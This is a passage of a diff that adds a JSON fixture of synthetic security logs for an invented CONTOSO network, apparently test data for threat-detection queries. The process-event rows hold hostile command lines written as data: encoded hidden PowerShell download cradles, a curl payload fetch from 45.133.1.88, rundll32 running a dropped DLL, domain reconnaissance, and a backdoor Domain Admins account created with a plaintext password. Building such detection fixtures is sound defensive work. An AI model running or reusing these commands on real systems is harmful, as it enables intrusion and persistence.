@@ -1,0 +1,473 @@
+{
+  "version": "1.0.0",
+  "fixtures": [
+    {
+      "name": "SecurityEvent",
+      "columns": {
+        "TimeGenerated": "datetime",
+        "Computer": "string",
+        "EventID": "int",
+        "Account": "string",
+        "AccountType": "string",
+        "LogonType": "int",
+        "IpAddress": "string",
+        "Activity": "string",
+        "LogonProcessName": "string"
+      },
+      "rows": [
+        {"TimeGenerated": "2026-09-07T01:12:05Z", "Computer": "WEB01", "EventID": 4625, "Account": "CONTOSO\\jsmith", "AccountType": "User", "LogonType": 3, "IpAddress": "203.0.113.45", "Activity": "4625 - An account failed to log on.", "LogonProcessName": "NtLmSsp"},
+        {"TimeGenerated": "2026-09-07T01:12:31Z", "Computer": "WEB01", "EventID": 4625, "Account": "CONTOSO\\jsmith", "AccountType": "User", "LogonType": 3, "IpAddress": "203.0.113.45", "Activity": "4625 - An account failed to log on.", "LogonProcessName": "NtLmSsp"},
+        {"TimeGenerated": "2026-09-07T01:13:02Z", "Computer": "WEB01", "EventID": 4625, "Account": "CONTOSO\\jsmith", "AccountType": "User", "LogonType": 3, "IpAddress": "203.0.113.45", "Activity": "4625 - An account failed to log on.", "LogonProcessName": "NtLmSsp"},
+        {"TimeGenerated": "2026-09-07T01:13:44Z", "Computer": "WEB01", "EventID": 4625, "Account": "CONTOSO\\jsmith", "AccountType": "User", "LogonType": 3, "IpAddress": "203.0.113.45", "Activity": "4625 - An account failed to log on.", "LogonProcessName": "NtLmSsp"},
+        {"TimeGenerated": "2026-09-07T01:14:20Z", "Computer": "WEB01", "EventID": 4625, "Account": "CONTOSO\\jsmith", "AccountType": "User", "LogonType": 3, "IpAddress": "203.0.113.45", "Activity": "4625 - An account failed to log on.", "LogonProcessName": "NtLmSsp"},
+        {"TimeGenerated": "2026-09-07T01:15:09Z", "Computer": "WEB01", "EventID": 4624, "Account": "CONTOSO\\jsmith", "AccountType": "User", "LogonType": 3, "IpAddress": "203.0.113.45", "Activity": "4624 - An account was successfully logged on.", "LogonProcessName": "NtLmSsp"},
+        {"TimeGenerated": "2026-09-07T01:15:41Z", "Computer": "WEB01", "EventID": 4672, "Account": "CONTOSO\\jsmith", "AccountType": "User", "LogonType": 3, "IpAddress": "203.0.113.45", "Activity": "4672 - Special privileges assigned to new logon.", "LogonProcessName": "NtLmSsp"},
+        {"TimeGenerated": "2026-09-07T02:41:17Z", "Computer": "FIN-SQL02", "EventID": 4625, "Account": "CONTOSO\\svc_backup", "AccountType": "User", "LogonType": 3, "IpAddress": "198.51.100.22", "Activity": "4625 - An account failed to log on.", "LogonProcessName": "NtLmSsp"},
+        {"TimeGenerated": "2026-09-07T02:42:50Z", "Computer": "FIN-SQL02", "EventID": 4625, "Account": "CONTOSO\\svc_backup", "AccountType": "User", "LogonType": 3, "IpAddress": "198.51.100.22", "Activity": "4625 - An account failed to log on.", "LogonProcessName": "NtLmSsp"},
+        {"TimeGenerated": "2026-09-07T03:05:12Z", "Computer": "FIN-SQL02", "EventID": 4624, "Account": "CONTOSO\\dba_ops", "AccountType": "User", "LogonType": 10, "IpAddress": "10.10.4.55", "Activity": "4624 - An account was successfully logged on.", "LogonProcessName": "User32"},
+        {"TimeGenerated": "2026-09-07T08:30:00Z", "Computer": "HR-WKS14", "EventID": 4624, "Account": "CONTOSO\\mgarcia", "AccountType": "User", "LogonType": 2, "IpAddress": "10.10.8.31", "Activity": "4624 - An account was successfully logged on.", "LogonProcessName": "User32"},
+        {"TimeGenerated": "2026-09-07T09:02:44Z", "Computer": "HR-WKS14", "EventID": 4688, "Account": "CONTOSO\\mgarcia", "AccountType": "User", "LogonType": 0, "IpAddress": "-", "Activity": "4688 - A new process has been created.", "LogonProcessName": "-"},
+        {"TimeGenerated": "2026-09-08T04:18:33Z", "Computer": "DC01", "EventID": 4720, "Account": "CONTOSO\\admin_pete", "AccountType": "User", "LogonType": 0, "IpAddress": "-", "Activity": "4720 - A user account was created.", "LogonProcessName": "-"},
+        {"TimeGenerated": "2026-09-08T04:19:10Z", "Computer": "DC01", "EventID": 4672, "Account": "CONTOSO\\admin_pete", "AccountType": "User", "LogonType": 10, "IpAddress": "10.10.1.20", "Activity": "4672 - Special privileges assigned to new logon.", "LogonProcessName": "User32"},
+        {"TimeGenerated": "2026-09-08T11:55:02Z", "Computer": "WEB01", "EventID": 4625, "Account": "CONTOSO\\administrator", "AccountType": "User", "LogonType": 3, "IpAddress": "203.0.113.45", "Activity": "4625 - An account failed to log on.", "LogonProcessName": "NtLmSsp"},
+        {"TimeGenerated": "2026-09-08T11:56:48Z", "Computer": "WEB01", "EventID": 4625, "Account": "CONTOSO\\administrator", "AccountType": "User", "LogonType": 3, "IpAddress": "203.0.113.45", "Activity": "4625 - An account failed to log on.", "LogonProcessName": "NtLmSsp"},
+        {"TimeGenerated": "2026-09-08T22:14:06Z", "Computer": "FIN-SQL02", "EventID": 4624, "Account": "CONTOSO\\svc_backup", "AccountType": "User", "LogonType": 5, "IpAddress": "10.10.4.9", "Activity": "4624 - An account was successfully logged on.", "LogonProcessName": "Advapi"},
+        {"TimeGenerated": "2026-09-09T06:47:29Z", "Computer": "HR-WKS14", "EventID": 4625, "Account": "CONTOSO\\mgarcia", "AccountType": "User", "LogonType": 2, "IpAddress": "10.10.8.31", "Activity": "4625 - An account failed to log on.", "LogonProcessName": "User32"}
+      ]
+    },
+    {
+      "name": "SigninLogs",
+      "columns": {
+        "TimeGenerated": "datetime",
+        "UserPrincipalName": "string",
+        "UserDisplayName": "string",
+        "AppDisplayName": "string",
+        "IPAddress": "string",
+        "Location": "string",
+        "ResultType": "string",
+        "ResultDescription": "string",
+        "ClientAppUsed": "string",
+        "RiskLevelDuringSignIn": "string"
+      },
+      "rows": [
+        {"TimeGenerated": "2026-09-07T01:11:40Z", "UserPrincipalName": "jsmith@contoso.com", "UserDisplayName": "Jordan Smith", "AppDisplayName": "Office 365 Exchange Online", "IPAddress": "203.0.113.45", "Location": "RO", "ResultType": "50126", "ResultDescription": "Invalid username or password", "ClientAppUsed": "Browser", "RiskLevelDuringSignIn": "high"},
+        {"TimeGenerated": "2026-09-07T01:12:55Z", "UserPrincipalName": "jsmith@contoso.com", "UserDisplayName": "Jordan Smith", "AppDisplayName": "Office 365 Exchange Online", "IPAddress": "203.0.113.45", "Location": "RO", "ResultType": "50126", "ResultDescription": "Invalid username or password", "ClientAppUsed": "Browser", "RiskLevelDuringSignIn": "high"},
+        {"TimeGenerated": "2026-09-07T01:14:02Z", "UserPrincipalName": "jsmith@contoso.com", "UserDisplayName": "Jordan Smith", "AppDisplayName": "Office 365 Exchange Online", "IPAddress": "203.0.113.45", "Location": "RO", "ResultType": "50126", "ResultDescription": "Invalid username or password", "ClientAppUsed": "Browser", "RiskLevelDuringSignIn": "high"},
+        {"TimeGenerated": "2026-09-07T01:16:20Z", "UserPrincipalName": "jsmith@contoso.com", "UserDisplayName": "Jordan Smith", "AppDisplayName": "Office 365 Exchange Online", "IPAddress": "203.0.113.45", "Location": "RO", "ResultType": "0", "ResultDescription": "", "ClientAppUsed": "Browser", "RiskLevelDuringSignIn": "high"},
+        {"TimeGenerated": "2026-09-07T07:45:10Z", "UserPrincipalName": "jsmith@contoso.com", "UserDisplayName": "Jordan Smith", "AppDisplayName": "Microsoft Teams", "IPAddress": "63.140.32.18", "Location": "US", "ResultType": "0", "ResultDescription": "", "ClientAppUsed": "Mobile Apps and Desktop clients", "RiskLevelDuringSignIn": "none"},
+        {"TimeGenerated": "2026-09-07T08:02:13Z", "UserPrincipalName": "mgarcia@contoso.com", "UserDisplayName": "Maria Garcia", "AppDisplayName": "Microsoft Teams", "IPAddress": "63.140.32.18", "Location": "US", "ResultType": "0", "ResultDescription": "", "ClientAppUsed": "Mobile Apps and Desktop clients", "RiskLevelDuringSignIn": "none"},
+        {"TimeGenerated": "2026-09-07T08:30:45Z", "UserPrincipalName": "mgarcia@contoso.com", "UserDisplayName": "Maria Garcia", "AppDisplayName": "Office 365 SharePoint Online", "IPAddress": "63.140.32.18", "Location": "US", "ResultType": "0", "ResultDescription": "", "ClientAppUsed": "Browser", "RiskLevelDuringSignIn": "none"},
+        {"TimeGenerated": "2026-09-07T12:20:31Z", "UserPrincipalName": "dba_ops@contoso.com", "UserDisplayName": "DBA Operations", "AppDisplayName": "Azure Portal", "IPAddress": "63.140.32.18", "Location": "US", "ResultType": "0", "ResultDescription": "", "ClientAppUsed": "Browser", "RiskLevelDuringSignIn": "none"},
+        {"TimeGenerated": "2026-09-07T12:21:09Z", "UserPrincipalName": "dba_ops@contoso.com", "UserDisplayName": "DBA Operations", "AppDisplayName": "Azure Portal", "IPAddress": "63.140.32.18", "Location": "US", "ResultType": "50074", "ResultDescription": "Strong Authentication is required", "ClientAppUsed": "Browser", "RiskLevelDuringSignIn": "none"},
+        {"TimeGenerated": "2026-09-08T03:14:52Z", "UserPrincipalName": "svc_automation@contoso.com", "UserDisplayName": "Automation Service", "AppDisplayName": "Azure Portal", "IPAddress": "185.220.101.34", "Location": "NL", "ResultType": "50126", "ResultDescription": "Invalid username or password", "ClientAppUsed": "Browser", "RiskLevelDuringSignIn": "high"},
+        {"TimeGenerated": "2026-09-08T03:15:40Z", "UserPrincipalName": "svc_automation@contoso.com", "UserDisplayName": "Automation Service", "AppDisplayName": "Azure Portal", "IPAddress": "185.220.101.34", "Location": "NL", "ResultType": "50126", "ResultDescription": "Invalid username or password", "ClientAppUsed": "Browser", "RiskLevelDuringSignIn": "high"},
+        {"TimeGenerated": "2026-09-08T03:16:22Z", "UserPrincipalName": "svc_automation@contoso.com", "UserDisplayName": "Automation Service", "AppDisplayName": "Azure Portal", "IPAddress": "185.220.101.34", "Location": "NL", "ResultType": "50126", "ResultDescription": "Invalid username or password", "ClientAppUsed": "Browser", "RiskLevelDuringSignIn": "high"},
+        {"TimeGenerated": "2026-09-08T03:17:05Z", "UserPrincipalName": "svc_automation@contoso.com", "UserDisplayName": "Automation Service", "AppDisplayName": "Azure Portal", "IPAddress": "185.220.101.34", "Location": "NL", "ResultType": "50126", "ResultDescription": "Invalid username or password", "ClientAppUsed": "Browser", "RiskLevelDuringSignIn": "high"},
+        {"TimeGenerated": "2026-09-08T03:18:11Z", "UserPrincipalName": "svc_automation@contoso.com", "UserDisplayName": "Automation Service", "AppDisplayName": "Azure Portal", "IPAddress": "185.220.101.34", "Location": "NL", "ResultType": "53003", "ResultDescription": "Access has been blocked by Conditional Access policies", "ClientAppUsed": "Browser", "RiskLevelDuringSignIn": "high"},
+        {"TimeGenerated": "2026-09-08T09:05:00Z", "UserPrincipalName": "admin_pete@contoso.com", "UserDisplayName": "Pete Nakamura", "AppDisplayName": "Azure Portal", "IPAddress": "63.140.32.18", "Location": "US", "ResultType": "0", "ResultDescription": "", "ClientAppUsed": "Browser", "RiskLevelDuringSignIn": "none"},
+        {"TimeGenerated": "2026-09-08T09:41:27Z", "UserPrincipalName": "admin_pete@contoso.com", "UserDisplayName": "Pete Nakamura", "AppDisplayName": "Azure Active Directory PowerShell", "IPAddress": "63.140.32.18", "Location": "US", "ResultType": "0", "ResultDescription": "", "ClientAppUsed": "Mobile Apps and Desktop clients", "RiskLevelDuringSignIn": "none"},
+        {"TimeGenerated": "2026-09-09T02:33:18Z", "UserPrincipalName": "mgarcia@contoso.com", "UserDisplayName": "Maria Garcia", "AppDisplayName": "Office 365 Exchange Online", "IPAddress": "91.219.236.14", "Location": "RU", "ResultType": "0", "ResultDescription": "", "ClientAppUsed": "Browser", "RiskLevelDuringSignIn": "high"},
+        {"TimeGenerated": "2026-09-09T06:45:12Z", "UserPrincipalName": "mgarcia@contoso.com", "UserDisplayName": "Maria Garcia", "AppDisplayName": "Office 365 SharePoint Online", "IPAddress": "63.140.32.18", "Location": "US", "ResultType": "0", "ResultDescription": "", "ClientAppUsed": "Browser", "RiskLevelDuringSignIn": "medium"}
+      ]
+    },
+    {
+      "name": "DeviceProcessEvents",
+      "columns": {
+        "TimeGenerated": "datetime",
+        "DeviceName": "string",
+        "AccountName": "string",
+        "FileName": "string",
+        "ProcessCommandLine": "string",
+        "InitiatingProcessFileName": "string",
+        "SHA256": "string",
+        "ProcessId": "int"
+      },
+      "rows": [
+        {"TimeGenerated": "2026-09-07T01:18:22Z", "DeviceName": "web01.contoso.com", "AccountName": "jsmith", "FileName": "powershell.exe", "ProcessCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==", "InitiatingProcessFileName": "w3wp.exe", "SHA256": "9f2a71c4d38b5e601a4c7f93b25d8e046c1f9a37e4b08d527a3c6e1905d2b8f4", "ProcessId": 4820},
+        {"TimeGenerated": "2026-09-07T01:19:05Z", "DeviceName": "web01.contoso.com", "AccountName": "jsmith", "FileName": "whoami.exe", "ProcessCommandLine": "whoami /all", "InitiatingProcessFileName": "powershell.exe", "SHA256": "3b8e4d17c920a5f648d31b7e5f0c9a24e17b36d8029fc4a56d5e81b3ac4702f9", "ProcessId": 5104},
+        {"TimeGenerated": "2026-09-07T01:19:31Z", "DeviceName": "web01.contoso.com", "AccountName": "jsmith", "FileName": "net.exe", "ProcessCommandLine": "net group \"Domain Admins\" /domain", "InitiatingProcessFileName": "powershell.exe", "SHA256": "7c4d19a25e8b03f6a91d47c82f6035be8d14a7e9c503f28b41e97d6ab8205cf3", "ProcessId": 5260},
+        {"TimeGenerated": "2026-09-07T01:20:14Z", "DeviceName": "web01.contoso.com", "AccountName": "jsmith", "FileName": "nltest.exe", "ProcessCommandLine": "nltest /dclist:contoso.com", "InitiatingProcessFileName": "powershell.exe", "SHA256": "d61f8b243a09e7c59b4d260f7e58c3a104f2b96dc8e371502a6b9df45107ce83", "ProcessId": 5312},
+        {"TimeGenerated": "2026-09-07T01:22:48Z", "DeviceName": "web01.contoso.com", "AccountName": "jsmith", "FileName": "rundll32.exe", "ProcessCommandLine": "rundll32.exe C:\\Users\\Public\\up.dll,Start", "InitiatingProcessFileName": "powershell.exe", "SHA256": "e2a70d931c845fb678e309d2b46f1ca59d02e87135bc6a04f18d27e96053ba4c", "ProcessId": 5488},
+        {"TimeGenerated": "2026-09-07T09:03:12Z", "DeviceName": "hr-wks14.contoso.com", "AccountName": "mgarcia", "FileName": "winword.exe", "ProcessCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\mgarcia\\Downloads\\Invoice_0907.docm\"", "InitiatingProcessFileName": "explorer.exe", "SHA256": "5a3c81e7d0294fb86e17c50392bd48a61f70e9c284a5d31bcb6029f73e48157d", "ProcessId": 3128},
+        {"TimeGenerated": "2026-09-07T09:04:01Z", "DeviceName": "hr-wks14.contoso.com", "AccountName": "mgarcia", "FileName": "powershell.exe", "ProcessCommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\mgarcia\\AppData\\Local\\Temp\\update.ps1", "InitiatingProcessFileName": "winword.exe", "SHA256": "9f2a71c4d38b5e601a4c7f93b25d8e046c1f9a37e4b08d527a3c6e1905d2b8f4", "ProcessId": 3344},
+        {"TimeGenerated": "2026-09-07T09:05:37Z", "DeviceName": "hr-wks14.contoso.com", "AccountName": "mgarcia", "FileName": "curl.exe", "ProcessCommandLine": "curl.exe -o C:\\Users\\mgarcia\\AppData\\Local\\Temp\\p.bin http://45.133.1.88/p.bin", "InitiatingProcessFileName": "powershell.exe", "SHA256": "b9370a4d2e18c6f550b39d81a7c402e63f9168bdd25ea0378c41b9f206d5738a", "ProcessId": 3512},
+        {"TimeGenerated": "2026-09-07T10:15:00Z", "DeviceName": "fin-sql02.contoso.com", "AccountName": "dba_ops", "FileName": "sqlcmd.exe", "ProcessCommandLine": "sqlcmd.exe -S localhost -Q \"BACKUP DATABASE payroll TO DISK='D:\\bak\\payroll.bak'\"", "InitiatingProcessFileName": "cmd.exe", "SHA256": "4d81f7a063b5e2c91870d4afe59c3b16a2470fd89b031e657fc28a43d16b950e", "ProcessId": 6120},
+        {"TimeGenerated": "2026-09-07T10:16:40Z", "DeviceName": "fin-sql02.contoso.com", "AccountName": "dba_ops", "FileName": "cmd.exe", "ProcessCommandLine": "cmd.exe /c dir D:\\bak", "InitiatingProcessFileName": "explorer.exe", "SHA256": "8e0b52d7f4936a1c2d7ec085b613af4970c15e2b39d8064fa5f27c31e809bd46", "ProcessId": 6208},
+        {"TimeGenerated": "2026-09-08T04:20:05Z", "DeviceName": "dc01.contoso.com", "AccountName": "admin_pete", "FileName": "net.exe", "ProcessCommandLine": "net user svc_helpdesk P@ssw0rd!2026 /add /domain", "InitiatingProcessFileName": "cmd.exe", "SHA256": "7c4d19a25e8b03f6a91d47c82f6035be8d14a7e9c503f28b41e97d6ab8205cf3", "ProcessId": 2204},
+        {"TimeGenerated": "2026-09-08T04:20:52Z", "DeviceName": "dc01.contoso.com", "AccountName": "admin_pete", "FileName": "net.exe", "ProcessCommandLine": "net group \"Domain Admins\" svc_helpdesk /add /domain", "InitiatingProcessFileName": "cmd.exe", "SHA256": "7c4d19a25e8b03f6a91d47c82f6035be8d14a7e9c503f28b41e97d6ab8205cf3", "ProcessId": 2260},
+        {"TimeGenerated": "2026-09-08T13:02:19Z", "DeviceName": "web01.contoso.com", "AccountName": "SYSTEM", "FileName": "w3wp.exe", "ProcessCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\"", "InitiatingProcessFileName": "services.exe", "SHA256": "1f6a904cb78d3e250c94f61ad382b57e6a05c9d324eb178f9350ae6bc7f14d02", "ProcessId": 1880},
+        {"TimeGenerated": "2026-09-08T22:15:33Z", "DeviceName": "fin-sql02.contoso.com", "AccountName": "svc_backup", "FileName": "robocopy.exe", "ProcessCommandLine": "robocopy.exe D:\\bak \\\\10.10.4.9\\archive /MIR", "InitiatingProcessFileName": "cmd.exe", "SHA256": "a047e39b5c126df883b0a475e91f6c2db5384a076ed2915c0fa73be894c5061d", "ProcessId": 7044},
+        {"TimeGenerated": "2026-09-09T06:48:10Z", "DeviceName": "hr-wks14.contoso.com", "AccountName": "mgarcia", "FileName": "powershell.exe", "ProcessCommandLine": "powershell.exe -nop -enc aQB3AHIAIAA0ADUALgAxADMAMwAuADEALgA4ADgALwBzADIA", "InitiatingProcessFileName": "explorer.exe", "SHA256": "9f2a71c4d38b5e601a4c7f93b25d8e046c1f9a37e4b08d527a3c6e1905d2b8f4", "ProcessId": 3990},
+        {"TimeGenerated": "2026-09-09T07:30:44Z", "DeviceName": "hr-wks14.contoso.com", "AccountName": "mgarcia", "FileName": "chrome.exe", "ProcessCommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"", "InitiatingProcessFileName": "explorer.exe", "SHA256": "6b25c8f097a41d3ec05827bd4e39f61a82d7053c1ab9e4785f60c2d93072ae5b", "ProcessId": 4102}
+      ]
+    },
+    {
+      "name": "DeviceNetworkEvents",
+      "columns": {
+        "TimeGenerated": "datetime",
+        "DeviceName": "string",
+        "ActionType": "string",
+        "RemoteIP": "string",
+        "RemotePort": "int",
+        "RemoteUrl": "string",
+        "Protocol": "string",
+        "InitiatingProcessFileName": "string",
+        "InitiatingProcessAccountName": "string"
+      },
+      "rows": [
+        {"TimeGenerated": "2026-09-07T01:18:40Z", "DeviceName": "web01.contoso.com", "ActionType": "ConnectionSuccess", "RemoteIP": "45.133.1.88", "RemotePort": 443, "RemoteUrl": "cdn-update-svc.net", "Protocol": "Tcp", "InitiatingProcessFileName": "powershell.exe", "InitiatingProcessAccountName": "jsmith"},
+        {"TimeGenerated": "2026-09-07T01:23:02Z", "DeviceName": "web01.contoso.com", "ActionType": "ConnectionSuccess", "RemoteIP": "45.133.1.88", "RemotePort": 443, "RemoteUrl": "cdn-update-svc.net", "Protocol": "Tcp", "InitiatingProcessFileName": "rundll32.exe", "InitiatingProcessAccountName": "jsmith"},
+        {"TimeGenerated": "2026-09-07T01:28:02Z", "DeviceName": "web01.contoso.com", "ActionType": "ConnectionSuccess", "RemoteIP": "45.133.1.88", "RemotePort": 443, "RemoteUrl": "cdn-update-svc.net", "Protocol": "Tcp", "InitiatingProcessFileName": "rundll32.exe", "InitiatingProcessAccountName": "jsmith"},
+        {"TimeGenerated": "2026-09-07T01:33:02Z", "DeviceName": "web01.contoso.com", "ActionType": "ConnectionSuccess", "RemoteIP": "45.133.1.88", "RemotePort": 443, "RemoteUrl": "cdn-update-svc.net", "Protocol": "Tcp", "InitiatingProcessFileName": "rundll32.exe", "InitiatingProcessAccountName": "jsmith"},
+        {"TimeGenerated": "2026-09-07T09:05:41Z", "DeviceName": "hr-wks14.contoso.com", "ActionType": "ConnectionSuccess", "RemoteIP": "45.133.1.88", "RemotePort": 80, "RemoteUrl": "http://45.133.1.88/p.bin", "Protocol": "Tcp", "InitiatingProcessFileName": "curl.exe", "InitiatingProcessAccountName": "mgarcia"},
+        {"TimeGenerated": "2026-09-07T09:07:13Z", "DeviceName": "hr-wks14.contoso.com", "ActionType": "ConnectionFailed", "RemoteIP": "45.133.1.88", "RemotePort": 4444, "RemoteUrl": "", "Protocol": "Tcp", "InitiatingProcessFileName": "powershell.exe", "InitiatingProcessAccountName": "mgarcia"},
+        {"TimeGenerated": "2026-09-07T09:12:55Z", "DeviceName": "hr-wks14.contoso.com", "ActionType": "ConnectionSuccess", "RemoteIP": "142.250.72.14", "RemotePort": 443, "RemoteUrl": "www.google.com", "Protocol": "Tcp", "InitiatingProcessFileName": "chrome.exe", "InitiatingProcessAccountName": "mgarcia"},
+        {"TimeGenerated": "2026-09-07T10:17:22Z", "DeviceName": "fin-sql02.contoso.com", "ActionType": "ConnectionSuccess", "RemoteIP": "10.10.4.9", "RemotePort": 445, "RemoteUrl": "", "Protocol": "Tcp", "InitiatingProcessFileName": "cmd.exe", "InitiatingProcessAccountName": "dba_ops"},
+        {"TimeGenerated": "2026-09-07T11:02:04Z", "DeviceName": "web01.contoso.com", "ActionType": "ConnectionSuccess", "RemoteIP": "20.190.159.75", "RemotePort": 443, "RemoteUrl": "login.microsoftonline.com", "Protocol": "Tcp", "InitiatingProcessFileName": "w3wp.exe", "InitiatingProcessAccountName": "SYSTEM"},
+        {"TimeGenerated": "2026-09-08T03:19:44Z", "DeviceName": "dc01.contoso.com", "ActionType": "ConnectionFailed", "RemoteIP": "185.220.101.34", "RemotePort": 3389, "RemoteUrl": "", "Protocol": "Tcp", "InitiatingProcessFileName": "svchost.exe", "InitiatingProcessAccountName": "SYSTEM"},
+        {"TimeGenerated": "2026-09-08T04:21:30Z", "DeviceName": "dc01.contoso.com", "ActionType": "ConnectionSuccess", "RemoteIP": "10.10.1.20", "RemotePort": 445, "RemoteUrl": "", "Protocol": "Tcp", "InitiatingProcessFileName": "lsass.exe", "InitiatingProcessAccountName": "admin_pete"},
+        {"TimeGenerated": "2026-09-08T13:03:50Z", "DeviceName": "web01.contoso.com", "ActionType": "ConnectionSuccess", "RemoteIP": "20.190.159.75", "RemotePort": 443, "RemoteUrl": "login.microsoftonline.com", "Protocol": "Tcp", "InitiatingProcessFileName": "w3wp.exe", "InitiatingProcessAccountName": "SYSTEM"},
+        {"TimeGenerated": "2026-09-08T22:16:08Z", "DeviceName": "fin-sql02.contoso.com", "ActionType": "ConnectionSuccess", "RemoteIP": "10.10.4.9", "RemotePort": 445, "RemoteUrl": "", "Protocol": "Tcp", "InitiatingProcessFileName": "robocopy.exe", "InitiatingProcessAccountName": "svc_backup"},
+        {"TimeGenerated": "2026-09-09T02:34:02Z", "DeviceName": "hr-wks14.contoso.com", "ActionType": "ConnectionSuccess", "RemoteIP": "91.219.236.14", "RemotePort": 443, "RemoteUrl": "mail-relay-cdn.ru", "Protocol": "Tcp", "InitiatingProcessFileName": "outlook.exe", "InitiatingProcessAccountName": "mgarcia"},
+        {"TimeGenerated": "2026-09-09T06:49:20Z", "DeviceName": "hr-wks14.contoso.com", "ActionType": "ConnectionSuccess", "RemoteIP": "45.133.1.88", "RemotePort": 443, "RemoteUrl": "cdn-update-svc.net", "Protocol": "Tcp", "InitiatingProcessFileName": "powershell.exe", "InitiatingProcessAccountName": "mgarcia"},
+        {"TimeGenerated": "2026-09-09T07:31:02Z", "DeviceName": "hr-wks14.contoso.com", "ActionType": "ConnectionSuccess", "RemoteIP": "142.250.72.14", "RemotePort": 443, "RemoteUrl": "www.google.com", "Protocol": "Tcp", "InitiatingProcessFileName": "chrome.exe", "InitiatingProcessAccountName": "mgarcia"}
+      ]
+    },
+    {
+      "name": "AzureActivity",
+      "columns": {
+        "TimeGenerated": "datetime",
+        "Caller": "string",
+        "OperationNameValue": "string",
+        "ActivityStatusValue": "string",
+        "ResourceGroup": "string",
+        "CallerIpAddress": "string",
+        "SubscriptionId": "string",
+        "Level": "string",
+        "CategoryValue": "string"
+      },
+      "rows": [
+        {"TimeGenerated": "2026-09-07T12:22:40Z", "Caller": "dba_ops@contoso.com", "OperationNameValue": "MICROSOFT.SQL/SERVERS/DATABASES/WRITE", "ActivityStatusValue": "Succeeded", "ResourceGroup": "rg-fin-prod", "CallerIpAddress": "63.140.32.18", "SubscriptionId": "8f2a1c74-3b9e-4d52-a1f6-77c0e9b3d418", "Level": "Informational", "CategoryValue": "Administrative"},
+        {"TimeGenerated": "2026-09-07T12:25:11Z", "Caller": "dba_ops@contoso.com", "OperationNameValue": "MICROSOFT.SQL/SERVERS/FIREWALLRULES/WRITE", "ActivityStatusValue": "Succeeded", "ResourceGroup": "rg-fin-prod", "CallerIpAddress": "63.140.32.18", "SubscriptionId": "8f2a1c74-3b9e-4d52-a1f6-77c0e9b3d418", "Level": "Informational", "CategoryValue": "Administrative"},
+        {"TimeGenerated": "2026-09-07T13:40:02Z", "Caller": "admin_pete@contoso.com", "OperationNameValue": "MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/WRITE", "ActivityStatusValue": "Succeeded", "ResourceGroup": "rg-core-net", "CallerIpAddress": "63.140.32.18", "SubscriptionId": "8f2a1c74-3b9e-4d52-a1f6-77c0e9b3d418", "Level": "Warning", "CategoryValue": "Administrative"},
+        {"TimeGenerated": "2026-09-07T13:41:19Z", "Caller": "admin_pete@contoso.com", "OperationNameValue": "MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/DELETE", "ActivityStatusValue": "Succeeded", "ResourceGroup": "rg-core-net", "CallerIpAddress": "63.140.32.18", "SubscriptionId": "8f2a1c74-3b9e-4d52-a1f6-77c0e9b3d418", "Level": "Warning", "CategoryValue": "Administrative"},
+        {"TimeGenerated": "2026-09-07T15:08:33Z", "Caller": "svc_automation@contoso.com", "OperationNameValue": "MICROSOFT.COMPUTE/VIRTUALMACHINES/START/ACTION", "ActivityStatusValue": "Succeeded", "ResourceGroup": "rg-web-prod", "CallerIpAddress": "20.190.159.75", "SubscriptionId": "8f2a1c74-3b9e-4d52-a1f6-77c0e9b3d418", "Level": "Informational", "CategoryValue": "Administrative"},
+        {"TimeGenerated": "2026-09-07T15:12:47Z", "Caller": "svc_automation@contoso.com", "OperationNameValue": "MICROSOFT.COMPUTE/VIRTUALMACHINES/DEALLOCATE/ACTION", "ActivityStatusValue": "Succeeded", "ResourceGroup": "rg-web-prod", "CallerIpAddress": "20.190.159.75", "SubscriptionId": "8f2a1c74-3b9e-4d52-a1f6-77c0e9b3d418", "Level": "Informational", "CategoryValue": "Administrative"},
+        {"TimeGenerated": "2026-09-08T03:20:58Z", "Caller": "svc_automation@contoso.com", "OperationNameValue": "MICROSOFT.KEYVAULT/VAULTS/SECRETS/READ", "ActivityStatusValue": "Failed", "ResourceGroup": "rg-core-sec", "CallerIpAddress": "185.220.101.34", "SubscriptionId": "8f2a1c74-3b9e-4d52-a1f6-77c0e9b3d418", "Level": "Error", "CategoryValue": "Administrative"},
+        {"TimeGenerated": "2026-09-08T03:21:35Z", "Caller": "svc_automation@contoso.com", "OperationNameValue": "MICROSOFT.KEYVAULT/VAULTS/ACCESSPOLICIES/WRITE", "ActivityStatusValue": "Failed", "ResourceGroup": "rg-core-sec", "CallerIpAddress": "185.220.101.34", "SubscriptionId": "8f2a1c74-3b9e-4d52-a1f6-77c0e9b3d418", "Level": "Error", "CategoryValue": "Administrative"},
+        {"TimeGenerated": "2026-09-08T09:12:26Z", "Caller": "admin_pete@contoso.com", "OperationNameValue": "MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE", "ActivityStatusValue": "Succeeded", "ResourceGroup": "rg-core-sec", "CallerIpAddress": "63.140.32.18", "SubscriptionId": "8f2a1c74-3b9e-4d52-a1f6-77c0e9b3d418", "Level": "Warning", "CategoryValue": "Administrative"},
+        {"TimeGenerated": "2026-09-08T09:44:03Z", "Caller": "admin_pete@contoso.com", "OperationNameValue": "MICROSOFT.KEYVAULT/VAULTS/SECRETS/READ", "ActivityStatusValue": "Succeeded", "ResourceGroup": "rg-core-sec", "CallerIpAddress": "63.140.32.18", "SubscriptionId": "8f2a1c74-3b9e-4d52-a1f6-77c0e9b3d418", "Level": "Informational", "CategoryValue": "Administrative"},
+        {"TimeGenerated": "2026-09-08T14:30:17Z", "Caller": "dba_ops@contoso.com", "OperationNameValue": "MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION", "ActivityStatusValue": "Succeeded", "ResourceGroup": "rg-fin-prod", "CallerIpAddress": "63.140.32.18", "SubscriptionId": "8f2a1c74-3b9e-4d52-a1f6-77c0e9b3d418", "Level": "Informational", "CategoryValue": "Administrative"},
